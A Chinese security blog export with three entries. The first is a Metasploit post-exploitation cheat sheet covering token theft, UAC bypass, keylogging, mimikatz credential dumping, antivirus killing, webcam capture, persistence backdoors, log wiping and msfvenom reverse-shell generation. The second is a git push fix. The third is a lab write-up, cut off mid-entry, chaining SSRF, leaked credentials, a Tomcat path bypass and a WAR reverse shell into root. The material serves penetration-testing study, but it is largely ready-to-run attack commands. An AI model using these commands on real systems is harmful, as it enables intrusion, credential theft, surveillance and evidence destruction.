class="headerlink" title="migrate转移进程"></a>migrate转移进程</h4><p>获取当前进程PID getpid </p><p>获取进程列表 ps </p><p>转移进程 migrate PID </p><p>杀死进程 kill PID </p><p>自动进程迁移 run post/windows/manage/migrate </p><p>监听设置自动转移进程 set autorunscript migrate -f</p><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>使用模块 use incognito </p><p>查看可用token list_tokens -u </p><p>假冒SYSTEM权限 impersonate_token ‘NT AUTHORITY/SYSTEM’ </p><p>利用假冒身份执行命令 execute -f cmd.exe -i –t </p><p>或者直接shell即可 </p><p>返回原始权限 rev2self</p><h4 id="提权相关"><a href="#提权相关" class="headerlink" title="提权相关"></a>提权相关</h4><p>加载特权提升扩展模块 use priv </p><p>获取更多的特权 getprivs </p><p>查看补丁信息 run post/windows/gather/enum_patches </p><p>可利用exp提权检测 use post/multi/recon/local_exploit_suggester </p><p>系统服务权限配置错误 use exploit/windows/local/service_permissions </p><p>注册表键配置错误提取 use exploit/windows/local/always_install_elevated </p><p>可信任服务路径 use exploit/windows/local/trusted_service_path</p><h4 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a>bypassuac</h4><p>use exploit/windows/local/bypassuac </p><p>use exploit/windows/local/bypassuac_injection </p><p>use windows/local/bypassuac_vbs </p><p>use windows/local/ask</p><h4 id="键盘鼠标设置"><a href="#键盘鼠标设置" class="headerlink" title="键盘鼠标设置"></a>键盘鼠标设置</h4><p>禁用鼠标 uictl disable mouse </p><p>禁用键盘 uictl disable keyboard </p><p>启用鼠标 uictl enable mouse </p><p>启用键盘 uictl enable keyboard </p><p>键盘记录 </p><p>#开始键盘记录 </p><p>keyscan_start </p><p>#导出记录数据 </p><p>keyscan_dump </p><p>#结束键盘记录 </p><p>keyscan_stop</p><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>查看当前目录 pwd getwd </p><p>查看目标主机信息 sysinfo </p><p>检查目标机器闲置时间 idletime </p><p>获取代理信息 </p><p>getproxy </p><p>查看目标主机是否运行在虚拟机上 </p><p>run checkvm run post/windows/gather/checkvm </p><p>获取主机安装软件、补丁 </p><p>run post/windows/gather/enum_applications </p><p>获取目标主机环境变量 </p><p>run post/multi/gather/env </p><p>获取IE缓存 </p><p>run post/windows/gather/enum_ie </p><p>获取Chrome缓存 </p><p>run post/windows/gather/enum_chrome </p><p>获取Firefox缓存 </p><p>run post/windows/gather/enum_firefox </p><p>列举当前登录的用户 </p><p>run post/windows/gather/enum_logged_on_users </p><p>查找域控 </p><p>run post/windows/gather/enum_domain </p><p>Windows凭证搜索 </p><p>run post/windows/gather/enum_unattend </p><p>获取办公文档</p><p>run post/windows/gather/dumplinks </p><p>获取目标常见信息并保存到本地 run scraper </p><p>屏幕截图 </p><p>screenshot</p><h4 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h4><p>抓取自动登录的用户名和密码 </p><p>run post/windows/gather/credentials/windows_autologin </p><p>hashdump </p><p>run post/windows/gather/smart_hashdump</p><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>老版</p><p>加载 load mimikatz </p><p>获取hash值 msv </p><p>获取明文 Kerberos </p><p>获取系统账户信息 wdigest</p><p>新版</p><p>加载kiwi模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">load kiwi<br></code></pre></td></tr></table></figure><p>列举系统中的明文密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">creds_all<br></code></pre></td></tr></table></figure><p>creds_all：             #列举所有凭据<br>creds_kerberos：        #列举所有kerberos凭据<br>creds_msv：             #列举所有msv凭据<br>creds_ssp：             #列举所有ssp凭据<br>creds_tspkg：           #列举所有tspkg凭据<br>creds_wdigest：         #列举所有wdigest凭据<br>dcsync：                #通过DCSync检索用户帐户信息<br>dcsync_ntlm：           #通过DCSync检索用户帐户NTLM散列、SID和RID<br>golden_ticket_create：  #创建黄金票据<br>kerberos_ticket_list：  #列举kerberos票据<br>kerberos_ticket_purge： #清除kerberos票据<br>kerberos_ticket_use：   #使用kerberos票据<br>kiwi_cmd：              #执行mimikatz的命令，后面接mimikatz.exe的命令<br>lsa_dump_sam：          #dump出lsa的SAM<br>lsa_dump_secrets：      #dump出lsa的密文<br>password_change：       #修改密码<br>wifi_list：             #列出当前用户的wifi配置文件<br>wifi_list_shared：      #列出共享wifi配置文件/编码</p><p><strong>kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令:</strong></p><p>kiwi_cmd sekurlsa::logonpasswords</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220205000038842.png" alt="image-20220205000038842"></p><h4 id="获取域散列值"><a href="#获取域散列值" class="headerlink" title="获取域散列值"></a>获取域散列值</h4><p>/#使用psexec_ntdsgrab模块 </p><p>use auxiliary/admin/smb/psexec_ntdsgrab </p><p>set RHOST set SMBDomain </p><p>set SMBUser </p><p>set SMBPass </p><p>#基于meterpreter会话 </p><p>use windows/gather/credentials/domain_hashdump </p><p>set session ID</p><h4 id="流量抓取"><a href="#流量抓取" class="headerlink" title="流量抓取"></a>流量抓取</h4><p>查看网卡信息 </p><p>run packetrecorder -L </p><p>查看流量 </p><p>run packetrecorder -i &lt;网卡ID&gt;</p><h4 id="端口扫描、主机发现"><a href="#端口扫描、主机发现" class="headerlink" title="端口扫描、主机发现"></a>端口扫描、主机发现</h4><p>使用arp发现主机 </p><p>run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24 </p><p>扫描tcp端口 </p><p>run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</p><h4 id="防火墙、杀软"><a href="#防火墙、杀软" class="headerlink" title="防火墙、杀软"></a>防火墙、杀软</h4><p>关闭杀软 run killav </p><p>查看防火墙状态 run getcountermeasure</p><p>在shell中使用 </p><p>netsh firewall show opmode</p><h4 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h4><p>加载脚本模块 </p><p>powershell_import /root/Desktop/HostRecon.ps1 </p><p>执行加载的脚本 </p><p>powershell_execute Invoke-HostRecon</p><h4 id="Hash传递"><a href="#Hash传递" class="headerlink" title="Hash传递"></a>Hash传递</h4><p>use exploit/windows/smb/psexec</p><h4 id="摄像头、屏幕"><a href="#摄像头、屏幕" class="headerlink" title="摄像头、屏幕"></a>摄像头、屏幕</h4><p>查看摄像头信息 webcam_list </p><p>使用摄像头拍照 webcam_snap </p><p>屏幕监视 run vnc</p><h4 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h4><p>开启远程桌面 </p><p>run post/windows/manage/enable_rdp </p><p>添加用户 </p><p>run post/windows/manage/enable_rdp USERNAME=gugugu PASSWORD=Root123456789 </p><p>将3389端口转发到6662端口 </p><p>run post/windows/manage/enable_rdp FORWARD=true LPORT=6662</p><h4 id="cmdshell升级"><a href="#cmdshell升级" class="headerlink" title="cmdshell升级"></a>cmdshell升级</h4><p>查看全部会话 sessions </p><p>选择会话1 sessions 1 </p><p>升级meterpreter sessions -u 会话id</p><h4 id="持久化控制后门"><a href="#持久化控制后门" class="headerlink" title="持久化控制后门"></a>持久化控制后门</h4><p>run persistence -X -i 50 -p 4444 -r 192.168.1.7</p><p>use exploit/multi/handler </p><p>set payload windows/meterpreter/reverse_tcp </p><p>set LHOST 192.168.109.137 </p><p>set LPORT 4444 </p><p>exploit</p><h4 id="针对linux平台"><a href="#针对linux平台" class="headerlink" title="针对linux平台"></a>针对linux平台</h4><p>目标主机保存的ssh身份验证信息 </p><p>run post/multi/gather/ssh_creds</p><h4 id="擦屁股、清痕迹"><a href="#擦屁股、清痕迹" class="headerlink" title="擦屁股、清痕迹"></a>擦屁股、清痕迹</h4><p>删除添加的账号 </p><p>C:/Windows/system32&gt; net user 添加的用户名 /del </p><p>删除日志 </p><p>clearev </p><p>关闭所有session连接 </p><p>sessions -K </p><p>事件日志</p><p>查看事件日志 </p><p>run event_manager -i </p><p>清除事件日志 </p><p>run event_manager -c</p><h4 id="msf生成木马教程"><a href="#msf生成木马教程" class="headerlink" title="msf生成木马教程"></a>msf生成木马教程</h4><h5 id="生成木马命令：msfvenom-1"><a href="#生成木马命令：msfvenom-1" class="headerlink" title="生成木马命令：msfvenom"></a>生成木马命令：<code>msfvenom</code></h5><p>msfcenom详细语法<br>-e, –encoder [encoder] 指定需要使用的encoder（编码器）<br>-a, –arch &lt; architecture&gt; 指定payload的目标架构<br>–platform &lt; platform&gt; 指定payload的目标平台<br>-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度<br>-b, –bad-chars &lt; list&gt; 设定规避字符集，比如: &amp; #039;/x00/xff&amp; #039;<br>-i, –iterations &lt; count&gt; 指定payload的编码次数<br>-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件<br>-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板<br>-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行<br>–payload-options 列举payload的标准选项<br>-o, –out &lt; path&gt; 保存payload<br>-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式<br>–shellest 最小化生成payload<br>-h, –help 查看帮助选项<br>–help-formats 查看msf支持的输出格式列表</p><h5 id="生成木马语句-1"><a href="#生成木马语句-1" class="headerlink" title="生成木马语句"></a>生成木马语句</h5><p>二进制<br>linux:msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf</p><p>windows:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe</p><p>mac: msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho</p><p>web<br>php:msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ’ | tr -d ‘/n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p><p>asp:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp</p><p>jap:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp</p><p>war:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war</p><p>脚本<br>python:msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py</p><p>bash:msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh</p><p>perl:msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl</p><p>基于pdf的shellcode<br>use exploit/windows/fileformat/adobe_utilprintf<br>msf5 exploit(adobe_utilprintf)&gt;set FILENAME BestComputers-UpgradeInstructions.pdfset</p><p>PAYLOAD windows/meterpreter/reverse_tcp<br>其他的就自己填就好了</p><p>参考：</p><p><a href="https://blog.csdn.net/weixin_46789316/article/details/112135904">https://blog.csdn.net/weixin_46789316/article/details/112135904</a></p><p><a href="https://blog.csdn.net/hackzkaq/article/details/120825347">https://blog.csdn.net/hackzkaq/article/details/120825347</a></p><p>渗透攻击红队msf系列</p><p>pdf在：<a href="https://github.com/txluck/MSF_operation_guide">https://github.com/txluck/MSF_operation_guide</a></p><p>有错的地方 不足的地方请师傅们指出：</p><p><a href="https://github.com/txluck/MSF_operation_guide/issues">https://github.com/txluck/MSF_operation_guide/issues</a></p>]]></content>
    
    
    <categories>
      
      <category>MSF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MSF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gitpush失败</title>
    <link href="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/"/>
    <url>/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Logon-failed-use-ctrl-c-to-cancel-basic-credential-prompt"><a href="#Logon-failed-use-ctrl-c-to-cancel-basic-credential-prompt" class="headerlink" title="Logon failed, use ctrl+c to cancel basic credential prompt."></a><a href="https://www.cnblogs.com/steamed-twisted-roll/p/14155092.html">Logon failed, use ctrl+c to cancel basic credential prompt.</a></h1><p>本地推送代码带Git仓库失败,报错Logon failed, use ctrl+c to cancel basic credential prompt.</p><p>推送的时候弹出githup的登陆框,账号密码正确但是提示不正确</p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C1.png"></p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C2.png"></p><p>解决方法:在网页上登陆你自己的githup账号,点击右上角头像–&gt; setting –&gt; Developer settings –&gt; Personal access tokens页面</p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C3.png"></p><p>点击新建 genrate new token</p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C4.png"></p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C5.png"></p><p>新建完成,页面已经有一个新的token,这个页面先不要动,或者先复制出来,页面刷新后这个token就看不见了</p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C6.png"></p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C7.png"></p><p>回到git bash 继续提交,在githup登陆弹出框中输入账号密码,第一次输入的是你githup的账号密码,第二次弹出后输入git账号,密码换成刚刚生成的token.</p><p>如果两次错误,会提示你在git bash中输入账号,之后会弹出一个密码框,这个也是输入token</p><p>总之,账号还是输入你自己的git账号,密码,第二次之后输入token</p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C8.png"></p><p>成功后就能推送成功了</p><p>这个方法我这里有用,电脑是Windows系统</p>]]></content>
    
    
    <categories>
      
      <category>常见错误</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
      <tag>常见错误</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>迷糊的提权方式以及利用ssrf到最终提权靶机</title>
    <link href="/2022/01/22/%E8%BF%B7%E7%B3%8A%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8ssrf%E5%88%B0%E6%9C%80%E7%BB%88%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/"/>
    <url>/2022/01/22/%E8%BF%B7%E7%B3%8A%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8ssrf%E5%88%B0%E6%9C%80%E7%BB%88%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/10811">https://xz.aliyun.com/t/10811</a></p><p>目标是国外靶场</p><p>打过才知道 学的知识太少了<br>师傅们看看就行 大家都会 要是描述得不对的地方 求指点</p><p>本地环境： kali</p><h2 id="首先是通过ssrf拿下的靶机"><a href="#首先是通过ssrf拿下的靶机" class="headerlink" title="首先是通过ssrf拿下的靶机"></a>首先是通过ssrf拿下的靶机</h2><h3 id="第一台"><a href="#第一台" class="headerlink" title="第一台"></a>第一台</h3><p>因为是连了vpn的所以可以直接扫<br>目标ip:10.10.11.111<br>拿到目标 只有ip 那就先扫端口<br>nmap -v -sSV -Pn 10.10.11.111 -T4 -sC</p><p><img src="https://api2.mubu.com/v3/document_image/2b5874b4-2ba6-4837-9478-39f0e6b45dcb-11763069.jpg" alt="image"></p><p>没啥信息 只有80端口 那就打开web看看<br>直接访问10.10.11.111</p><p><img src="https://api2.mubu.com/v3/document_image/ee2d18b0-381b-490c-83db-d7ea3e6b632f-11763069.jpg" alt="image"></p><p>直接访问不了 添加host头</p><blockquote><p>echo “10.10.11.111 forge.xxx” &gt;&gt; /etc/hosts</p></blockquote><p>然后在次访问</p><p><img src="https://api2.mubu.com/v3/document_image/8a469e49-e676-4f34-a553-4cd96f55a114-11763069.jpg" alt="image"></p><p>能访问了 发现有个上传的地方</p><p><img src="https://api2.mubu.com/v3/document_image/9e2e0b4d-8c9b-4735-99d8-822e3069ca14-11763069.jpg" alt="image"></p><p><img src="https://api2.mubu.com/v3/document_image/1324a8c9-b539-4751-8516-f5cbec32c248-11763069.jpg" alt="image"></p><p>上传试试</p><p><img src="https://api2.mubu.com/v3/document_image/0c02f059-7fb8-4ee0-ac44-6e003c04b47e-11763069.jpg" alt="image"></p><p>发现重命名的后缀名 不解析 上传应该是没办法了 找找其他突破<br>先扫扫目录 和子域名<br>目录：gobuster dir -u <a href="http://forge.xxx/">http://forge.xxx/</a> -w /usr/share/wordlists/dirb/common.txt</p><p><img src="https://api2.mubu.com/v3/document_image/8abd3da4-213b-4c5e-bced-47f6fd4530e7-11763069.jpg" alt="image"></p><p>子域名：wfuzz -c -u “<a href="http://forge.xxx/%E2%80%9C">http://forge.xxx/“</a> -H “Host:FUZZ.forge.xxx” -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt</p><p><img src="https://api2.mubu.com/v3/document_image/6ac0b404-4b0a-4d6a-b364-5d75f7cf9c27-11763069.jpg" alt="image"></p><p>目录没扫出什么 扫到一个子域名 先进入看看<br>还是不能直接访问 先加入到host<br>echo “10.10.11.111 admin.forge.xxx” &gt;&gt; /etc/hosts</p><p>提示只能本地访问</p><p><img src="https://api2.mubu.com/v3/document_image/ffea800f-0a56-4aab-b623-50e1c1cf11f5-11763069.jpg" alt="image"></p><p>尝试加上X-Forwarded-For:127.0.0.1绕过失败。<br>但是前面那个上传的地方 还有一个上传路径的地方</p><p><img src="https://api2.mubu.com/v3/document_image/cf31cc76-7910-4191-8c57-db59fc63f362-11763069.jpg" alt="image"></p><p>但是直接上传会提示是黑名单地址</p><p><img src="https://api2.mubu.com/v3/document_image/eb5bfd91-dad0-4c72-99f7-b0db6c0f6e67-11763069.jpg" alt="image"></p><p>既然是黑名单 我们尝试绕过</p><p><img src="https://api2.mubu.com/v3/document_image/885d1a99-41a9-49a4-965a-c23b90bb93c3-11763069.jpg" alt="image"></p><p>大小写绕过了：<a href="http://admin.forge.xxx/">http://aDmin.forGe.xxx/</a><br>然后访问页面发现报错</p><p><img src="https://api2.mubu.com/v3/document_image/cc8d5c0c-3905-4ed6-81dd-d9e4faa2fa5c-11763069.jpg" alt="image"></p><p>然后通过抓返回包发现一个路径</p><p><img src="https://api2.mubu.com/v3/document_image/96964398-0f2e-4b71-815d-c457ae317e58-11763069.jpg" alt="image"></p><p>然后继续通过ssrf访问这个路径 继续进行抓包<br><a href="http://admin.forge.xxx/announcements">http://aDmin.forGe.xxx/announcements</a><br><img src="https://api2.mubu.com/v3/document_image/cb0a69bb-5fc7-4748-9206-7e7b3a5a4b94-11763069.jpg" alt="image"></p><p>然后访问路径抓取返回包 获得了ftp的密码</p><p><img src="https://api2.mubu.com/v3/document_image/e98fa15f-7dba-400f-bf54-6d1de195d0d4-11763069.jpg" alt="image"></p><p>user:heightofsecurity123!<br>以及获取/upload目录API用法，u=url<br><a href="http://admin.forge.xxx/upload?u=url">http://aDmin.forGe.xxx/upload?u=url</a></p><p>然后结合起来读取ftp<br><a href="ftp://user:heightofsecurity123!@forge.xxx/">ftp://user:heightofsecurity123!@FORGE.xxx</a></p><p><a href="http://admin.forge.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx">http://aDmin.forGe.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx</a></p><p><img src="https://api2.mubu.com/v3/document_image/e59b5cd8-5203-4496-9c4d-52a71316dcc6-11763069.jpg" alt="image"></p><p>然后继续bp抓返回包</p><p><img src="https://api2.mubu.com/v3/document_image/b4e7e9b6-1789-48d9-84d9-ff990d6d45df-11763069.jpg" alt="image"></p><p>可以成功访问到，也就是说我们现在可以利用ssrf读取系统文件了。user.txt在这就说明现在已经是用户家目录了。读取ssh私钥<br><a href="http://admin.forge.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx/.ssh/id_rsa">http://aDmin.forGe.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx/.ssh/id_rsa</a></p><p><img src="https://api2.mubu.com/v3/document_image/7a353a44-6dbf-4ab2-9d60-7820be498f40-11763069.jpg" alt="image"></p><p>用同样的方法读取</p><p><img src="https://api2.mubu.com/v3/document_image/52dc38f3-2583-4785-a14d-ac41ac21dac0-11763069.jpg" alt="image"></p><p>然后保存id_rsa</p><p><img src="https://api2.mubu.com/v3/document_image/dd110bb3-b516-4122-be51-c8e95d166f24-11763069.jpg" alt="image"></p><p>然后ssh连接<br>ssh -i id_rsa <a href="mailto:&#x75;&#x73;&#x65;&#x72;&#x40;&#x31;&#48;&#x2e;&#49;&#48;&#x2e;&#x31;&#49;&#x2e;&#49;&#x31;&#x31;">&#x75;&#x73;&#x65;&#x72;&#x40;&#x31;&#48;&#x2e;&#49;&#48;&#x2e;&#x31;&#49;&#x2e;&#49;&#x31;&#x31;</a></p><p><img src="https://api2.mubu.com/v3/document_image/e0239698-ac25-4bcb-bb76-3745f2e062fd-11763069.jpg" alt="image"></p><p>成功连接上来</p><p><img src="https://api2.mubu.com/v3/document_image/d5081e0d-31ce-458f-b77c-4069fe199bb1-11763069.jpg" alt="image"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>sudo -l 发现一个不需要密码执行的py文件</p><p><img src="https://api2.mubu.com/v3/document_image/b4eccb9a-0e65-4cfa-a239-8eec714f7bd7-11763069.jpg" alt="image"></p><p>然后看下这个文件</p><p><img src="https://api2.mubu.com/v3/document_image/2a6e2c39-8f05-4428-83b0-683b9ea512ec-11763069.jpg" alt="image"></p><p>发现是建立socket链接 监听40433端口 那就先执行这个py文件看看<br>先执行py文件看看 然后在用nc连接</p><p><img src="https://api2.mubu.com/v3/document_image/047fd3c2-59e0-42ac-aa46-115113aa4369-11763069.jpg" alt="image"></p><p>然后在随便输入的时候 发现会调用pdb调试<br>pdb模式下是可以执行python代码的。于是直接给bash加上suid提权</p><p><img src="https://api2.mubu.com/v3/document_image/b04c26bc-5721-4488-b661-e41da97d8924-11763069.jpg" alt="image"></p><p>pdb：pdb是The Python Debugger的缩写，为Python标准库的一个模块。该模块规定了一个Python程序交互式源代码调试器，支持设置断点，也支持源码级单步调试，栈帧监视，源代码列出，任意栈帧上下文的随机Python代码估值。</p><p>到此 这一台也就提权完毕</p><h2 id="第二台-利用ansible-playbook提权"><a href="#第二台-利用ansible-playbook提权" class="headerlink" title="第二台 利用ansible-playbook提权"></a>第二台 利用ansible-playbook提权</h2><h3 id="第二台"><a href="#第二台" class="headerlink" title="第二台"></a>第二台</h3><p>目标ip：10.10.10.250<br>拿到目标还是先扫描端口 进行信息收集</p><p><img src="https://api2.mubu.com/v3/document_image/04863ac9-d9cf-4e95-9f86-37a659f6fc3a-11763069.jpg" alt="image"></p><p>命令：nmap -v -sSV -Pn 10.10.10.250 -T4 -sC<br>发现开了22 443 8080<br>直接先打开8080端口看看</p><p><img src="https://api2.mubu.com/v3/document_image/9b96a63d-20fd-48bc-b21b-88a9d6ae2eaf-11763069.jpg" alt="image"></p><p>发现是一个登陆框 cms是 gitbucket<br>试了下弱口令 发现不存在 那就注册一个</p><p><img src="https://api2.mubu.com/v3/document_image/cc915f01-a5b7-4fe5-bb1e-e6ff8a4f3810-11763069.jpg" alt="image"></p><p>注册之后然后登录</p><p><img src="https://api2.mubu.com/v3/document_image/e5fd9cbb-c76a-4750-8905-18ca6de415a5-11763069.jpg" alt="image"></p><p>这应该是一个代码仓库</p><p><img src="https://api2.mubu.com/v3/document_image/b1cf2539-d293-4977-b65a-e2af9f552308-11763069.jpg" alt="image"></p><p>因为前面还有443端口开发 打开443端口看看</p><p><img src="https://api2.mubu.com/v3/document_image/4ca86c5a-fa40-478d-83aa-93a661b32811-11763069.jpg" alt="image"></p><p>之前nmap扫描出443端口，但是无法访问https，写入hosts尝试登录<br>添加到host 因为扫描出有一个seal.xxx</p><p><img src="https://api2.mubu.com/v3/document_image/42436620-2122-4193-a930-1c59b43155bb-11763069.jpg" alt="image"></p><p>echo 10.10.10.250 seal.xxx &gt;&gt; /etc/hosts<br>是一个商城 那8080 的的确是443的代码库</p><p>然后继续翻代码库 通过找最近commits 在tomcat里面翻到了账户密码</p><p><img src="https://api2.mubu.com/v3/document_image/90292c81-1956-4b24-9004-260ad74dd51c-11763069.jpg" alt="image"></p><p><img src="https://api2.mubu.com/v3/document_image/0f9dde11-d568-4fed-8f24-8e40b3432a7b-11763069.jpg" alt="image"></p><p><a href="http://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7">http://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7</a><br>username = tomcat<br>password = 42MrHBf*z8{Z%<br>尝试访问tomcat默认登录目录<br>/manager/status<br><a href="https://seal.xxx/manager/status">https://seal.xxx/manager/status</a></p><p><img src="https://api2.mubu.com/v3/document_image/20e57c4c-dd26-49ec-9322-6e48e5abff76-11763069.jpg" alt="image"></p><p>输入找到的账户密码 成功登录</p><p><img src="https://api2.mubu.com/v3/document_image/9316b83e-640b-4af3-9415-8dce6b933752-11763069.jpg" alt="image"></p><p>因为前面根据nmap 扫描出tomcat是通过反代的 这样会存在一个问题<br>这个问题这里参考<a href="https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/">https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/</a><br>管理界面/manager/html无法访问显示权限不够</p><p><img src="https://api2.mubu.com/v3/document_image/ac5a0704-181a-414c-bec9-d8088c3b9a62-11763069.jpg" alt="image"></p><p>这里就可以利用tomcat 和反代的漏洞 用..;/绕过</p><p><img src="https://api2.mubu.com/v3/document_image/b137a294-867b-4ad5-8814-1215184059b9-11763069.jpg" alt="image"></p><p><a href="https://seal.xxx/manager/status/..;/html">https://seal.xxx/manager/status/..;/html</a><br>然后这里有一个上传的地方</p><p><img src="https://api2.mubu.com/v3/document_image/8984b9f6-0f75-461f-8ece-dfdb6e35dd9f-11763069.jpg" alt="image"></p><p>然后打包一个war包的shell上传<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.46 LPORT=6666 -f war -o shell.war</p><p>在上传之前，请记住一件事。这里存在路径遍历漏洞。所以，你不能直接上传.war文件。唯一的过程是在上传之前修改路径，因此我在Burpsuite中拦截了上传请求以进一步修改。</p><p><img src="https://api2.mubu.com/v3/document_image/fc183b54-5bdf-46b7-8836-7edbcdb223b3-11763069.jpg" alt="image"></p><p><img src="https://api2.mubu.com/v3/document_image/245e4a1f-cd4b-444d-947e-ff5be5541a24-11763069.jpg" alt="image"></p><p>上传之后 开启监听 然后访问 <a href="https://seal.xxx/shell/">https://seal.xxx/shell/</a><br>nc -lvvp 6666</p><p><img src="https://api2.mubu.com/v3/document_image/8bb4c0fd-cba3-49a0-89a0-3c421b25b1d6-11763069.jpg" alt="image"></p><p><img src="https://api2.mubu.com/v3/document_image/4edd03c1-2702-41f3-b1c3-0930cca2f994-11763069.jpg" alt="image"></p><p>发现还有个luis 这个开始在8080端口里面也发现了</p><p><img src="https://api2.mubu.com/v3/document_image/ea6fe118-2f0c-4de3-86bf-fffade801216-11763069.jpg" alt="image"></p><p>然后在lusi目录下发现user.txt</p><p><img src="https://api2.mubu.com/v3/document_image/ccd92432-2616-4860-ae41-ec1a2f86140a-11763069.jpg" alt="image"></p><p>命令：find / -name user.txt<br>但是查看user.txt的时候发现没有权限</p><p><img src="https://api2.mubu.com/v3/document_image/6776569f-1c51-449a-8886-b0fad61c3ab4-11763069.jpg" alt="image"></p><p>需要提权了</p><h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>在查看进程的时候发现了一个有趣的进程</p><p><img src="https://api2.mubu.com/v3/document_image/f0d1e071-ce7b-498b-9bc7-dbf390a2dcab-11763069.jpg" alt="image"></p><p>命令：ps aux | grep root<br>然后我们看看run.yml文件</p><p><img src="https://api2.mubu.com/v3/document_image/7f9029bc-e2bd-4019-944d-15cd810a70ba-11763069.jpg" alt="image"></p><p>发现tomcat只有读的权限<br>cat /opt/backups/playbook/run.yml</p><p><img src="https://api2.mubu.com/v3/document_image/d5ee7b01-c400-4a1e-9841-ec40682e9c66-11763069.jpg" alt="image"></p><p>第 4 行至关重要。看起来这里脚本copy_links=yes在src和dest文件之间建立了符号链接（As ）。然后在第 8 行，它/opt/backups/archives以 gzip 格式备份文件。检查/var/lib/tomcat9/webapps/ROOT/admin/dashboard目录，</p><p><img src="https://api2.mubu.com/v3/document_image/4d45d27f-798d-400e-9986-229ddae797eb-11763069.jpg" alt="image"></p><p>发现只有uploads目录可写<br>网上了解搜索一下ansible playbook：<a 